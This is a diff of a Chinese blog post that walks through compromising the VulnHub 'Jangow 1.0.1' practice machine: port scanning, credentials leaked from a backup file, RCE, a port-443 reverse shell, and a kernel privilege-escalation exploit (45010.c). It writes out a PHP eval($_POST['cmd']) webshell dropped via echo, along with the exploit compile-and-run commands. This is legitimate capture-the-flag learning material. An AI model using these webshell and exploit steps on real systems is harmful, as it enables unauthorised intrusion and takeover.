@@ -13,16 +13,6 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="该靶机整体难度不高。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515115900.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121915.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120618.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103711.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103725.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120919.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121146.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121209.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121323.png">
 <meta property="article:published_time" content="2022-05-14T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-05-15T04:19:18.870Z">
 <meta property="article:author" content="hdfzzf">
@@ -31,7 +21,6 @@
 <meta property="article:tag" content="内核漏洞">
 <meta property="article:tag" content="备份文件泄露">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png">
     
     
       
@@ -168,7 +157,8 @@
 <h1 id="靶机信息">1. 靶机信息</h1>
 <p>靶机地址：</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jangow-101,754/">Jangow: 1.0.1 ~ VulnHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jangow-101,754/">Jangow:
+1.0.1 ~ VulnHub</a></li>
 </ul>
 <p>难度：</p>
 <ul>
@@ -182,39 +172,57 @@
 <h1 id="信息收集">2. 信息收集</h1>
 <h2 id="端口信息">2.1. 端口信息</h2>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.46</span><br><span class="line">3. sudo nmap -p21,80 -A 10.0.2.46</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png" /></p>
 <h2 id="网页信息">2.2. 网页信息</h2>
-<p>直接访问网页，发现一个目录 site，点击进入真正的页面，但是该页面没有功能点很少，当点击 Buscar 时，url 出现了变化，并且页面变白了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515115900.png" /></p>
+<p>直接访问网页，发现一个目录
+site，点击进入真正的页面，但是该页面没有功能点很少，当点击 Buscar
+时，url 出现了变化，并且页面变白了</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515115900.png" /></p>
 <p>但是还不知道这里的用途是什么。</p>
-<p>对 10.0.2.46 进行路径扫描，得到一个备份文件 .backup ，其中内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$database = &quot;jangow01&quot;;</span><br><span class="line">$username = &quot;jangow01&quot;;</span><br><span class="line">$password = &quot;abygurl69&quot;;</span><br><span class="line">// Create connection</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Connected successfully&quot;;</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p>
+<p>对 10.0.2.46 进行路径扫描，得到一个备份文件 .backup ，其中内容如下：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$database = &quot;jangow01&quot;;</span><br><span class="line">$username = &quot;jangow01&quot;;</span><br><span class="line">$password = &quot;abygurl69&quot;;</span><br><span class="line">// Create connection</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Connected successfully&quot;;</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p>
 <h2 id="其他信息">2.3. 其他信息</h2>
-<p>目前只有ftp需要登录信息，因此登录进去，在/var/www/html/site中找到了 burque.php 文件，内容如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121915.png" /></p>
+<p>目前只有ftp需要登录信息，因此登录进去，在/var/www/html/site中找到了
+burque.php 文件，内容如下：</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121915.png" /></p>
 <p>说明可以RCE。</p>
 <h1 id="反弹shell">3. 反弹shell</h1>
 <h2 id="方法1">3.1. 方法1</h2>
-<p>直接利用 RCE 反弹shell，这里需要注意的是端口被限制了，只允许反弹至kali的443端口</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120618.png" /></p>
+<p>直接利用 RCE
+反弹shell，这里需要注意的是端口被限制了，只允许反弹至kali的443端口</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120618.png" /></p>
 <blockquote>
-<p>如果端口被做了限制，那就使用54/UDP, 80/TCP, 443/TCP。第一个是DNS默认的端口，80为http默认端口，443为https默认端口，一般都处于开放状态，且允许发送、接收数据。</p>
+<p>如果端口被做了限制，那就使用54/UDP, 80/TCP,
+443/TCP。第一个是DNS默认的端口，80为http默认端口，443为https默认端口，一般都处于开放状态，且允许发送、接收数据。</p>
 </blockquote>
 <h2 id="方法2">3.2. 方法2</h2>
-<p>我最开始没想到方法1，想着是在没办法，先利用 RCE 写入一句话： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; reve.php</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; rev.php</span><br></pre></td></tr></table></figure></p>
+<p>我最开始没想到方法1，想着是在没办法，先利用 RCE 写入一句话：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; reve.php</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; rev.php</span><br></pre></td></tr></table></figure></p>
 <p>后者可以，前者不可以</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103711.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103725.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103711.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103725.png" /></p>
 <p>然后利用蚁剑连接上去</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120919.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120919.png" /></p>
 <p>虽然最后还是利用443端口反弹shell（😀）</p>
 <h1 id="权限提升">4. 权限提升</h1>
 <p>我因为是先上线了蚁剑，所以我利用蚁剑来发送脚本。</p>
-<p>先发送了一个 linux-exploit-suggester.sh，然后运行，得到许多可能存在的漏洞</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121146.png" /></p>
+<p>先发送了一个
+linux-exploit-suggester.sh，然后运行，得到许多可能存在的漏洞</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121146.png" /></p>
 <p>然后依次执行。现在kali上搜索</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121209.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121209.png" /></p>
 <p>然后利用蚁剑将文件传输到靶机，编译、执行 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. gcc 45010.c -o exp1</span><br><span class="line">2. chmod +x exp1</span><br><span class="line">3. ./exp1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121323.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121323.png" /></p>
 <p>最后的收尾工作，读取两个flag <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/jangow01/user.txt</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"></span><br><span class="line">// 2. /root/proof.txt</span><br><span class="line">                @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                                                                        </span><br><span class="line">                @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                                                                                        </span><br><span class="line">                @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                                                                                  </span><br><span class="line">                @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                                                                                  </span><br><span class="line">                @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                                                                                  </span><br><span class="line">                @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                                                                                 </span><br><span class="line">                @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                                                                                 </span><br><span class="line">                @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                                                                                </span><br><span class="line">                @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                 @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   </span><br><span class="line">                @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                              &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机整体难度不高，唯一的难点在于对端口做了限制。涉及到一下攻击方法：</p>
@@ -290,7 +298,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
